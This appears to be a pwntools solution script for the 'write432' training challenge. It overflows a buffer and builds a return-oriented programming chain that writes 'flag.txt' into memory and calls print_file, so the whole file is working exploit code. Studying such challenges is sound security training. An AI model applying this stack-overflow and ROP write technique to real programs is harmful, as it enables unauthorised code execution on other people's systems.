from pwn import *

pipe = process("./write432", env={"LD_PRELOAD":"libwrite432.so"})


print_file = 0x080483d0
gadget1 = 0x080485aa    # pop edi ; pop ebp ; ret
gadget2 = 0x08048543    # mov dword ptr [edi], ebp ; ret
target_mem = 0x0804af00

chain = "A" * 44
chain += p32(gadget1)
chain += p32(target_mem)
chain += b'flag'
chain += p32(gadget2)

chain += p32(gadget1)
chain += p32(target_mem+4)
chain += b'.txt'
chain += p32(gadget2)

chain += p32(print_file)
chain += p32(0xdeadbeef)
chain += p32(target_mem)

print(pipe.recvuntil("> "))
pipe.sendline(chain)
print(pipe.recv())